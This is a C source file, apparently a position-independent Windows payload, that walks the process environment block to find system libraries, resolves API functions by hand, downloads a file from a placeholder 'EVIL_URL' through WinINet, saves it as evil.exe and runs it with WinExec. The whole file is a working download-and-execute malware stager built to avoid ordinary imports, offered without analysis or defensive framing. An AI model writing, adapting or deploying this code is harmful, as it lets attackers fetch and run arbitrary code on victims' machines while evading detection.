#include "../include/hack.h"
#include "../include/peb_helper.h"
#include <windows.h>
#include <winternl.h>
#include <winuser.h>

#pragma clang section data = "payload_data"

static WCHAR url[] = EVIL_URL;
static WCHAR response_namew[] = L"evil.exe";
static char response_name[] = "evil.exe";

#pragma clang section data = ""

#pragma clang section text = "code$A"

int
main (void)
{
  PEB *peb = (PEB *)__readgsqword (0x60);
  if (!peb || !peb->Ldr)
    return 1;

  dll_base bases;
  bases.user32 = 0;
  bases.ntdll = 0;
  bases.kernel32 = 0;
  bases.kernelbase = 0;
  bases.wininet = 0;
  get_dll_base (peb->Ldr, &bases);

  load_libraryw_fn load_library;
  free_library_fn free_library;
  openw_fn openw;
  openurlw_fn openurlw;
  queryinfow_fn queryinfow;
  read_file_fn read_file;
  close_handle_fn close_handle;
  create_filew_fn create_file;
  write_file_fn write_file;
  close_file_fn close_file;
  winexec_fn winexec;

  // clang-format off
  if (get_func (bases.kernelbase, load_library_s, (uint64_t *)&load_library) != FUNC_DIRECT)
    return 1;

  if (get_func (bases.kernelbase, free_library_s, (uint64_t *)&free_library) != FUNC_DIRECT)
    return 1;

  if (get_func (bases.kernelbase, create_file_s, (uint64_t *)&create_file) != FUNC_DIRECT)
    return 1;

  if (get_func (bases.kernelbase, write_file_s, (uint64_t *)&write_file) != FUNC_DIRECT)
    return 1;

  if (get_func (bases.kernelbase, close_file_s, (uint64_t *)&close_file) != FUNC_DIRECT)
    return 1;

  HMODULE wininet_module = load_library (wininet);
  uint64_t wininet_base = (uint64_t)(uintptr_t)wininet_module;
  if (!wininet_base)
    return 1;

  if (get_func (wininet_base, open_s, (uint64_t *)&openw) != FUNC_DIRECT)
    goto unload;

  if (get_func (wininet_base, open_url_s, (uint64_t *)&openurlw) != FUNC_DIRECT)
    goto unload;

  if (get_func (wininet_base, query_info_s, (uint64_t *)&queryinfow) != FUNC_DIRECT)
    goto unload;

  if (get_func (wininet_base, read_file_s, (uint64_t *)&read_file) != FUNC_DIRECT)
    goto unload;

  if (get_func (wininet_base, close_handle_s, (uint64_t *)&close_handle) != FUNC_DIRECT)
    goto unload;

  if (get_func (wininet_base, close_handle_s, (uint64_t *)&close_handle) != FUNC_DIRECT)
    goto unload;

  if (get_func (bases.kernel32, winexec_s, (uint64_t *)&winexec) != FUNC_DIRECT)
    goto unload;
  // clang-format on

  char body[1024];
  DWORD got = 0;
  DWORD status = 0;
  DWORD status_size = sizeof (status);
  HINTERNET request = NULL;
  HANDLE output = INVALID_HANDLE_VALUE;

  HINTERNET session
      = openw (agent_name, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
  if (!session)
    goto unload;

  request = openurlw (session, url, NULL, 0,
                      INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE
                          | INTERNET_FLAG_SECURE,
                      0);
  if (!request)
    goto done;

  if (!queryinfow (request, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                   &status, &status_size, NULL)
      || status != 200)
    goto done;

  output = create_file (response_namew, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                        FILE_ATTRIBUTE_NORMAL, NULL);
  if (output == INVALID_HANDLE_VALUE)
    goto done;

  for (;;)
    {
      if (!read_file (request, body, (DWORD)sizeof (body), &got))
        goto done;
      if (got == 0)
        break;

      DWORD used = 0;
      while (used < got)
        {
          DWORD written = 0;
          if (!write_file (output, body + used, got - used, &written, NULL)
              || written == 0)
            goto done;
          used += written;
        }
    }

done:
  close_file (output);
  if (request)
    close_handle (request);
  close_handle (session);

  winexec (response_name, SW_SHOWNORMAL);

unload:
  free_library (wininet_module);
  return 0;
}

#pragma clang section text = ""

#include "peb_helper.c"
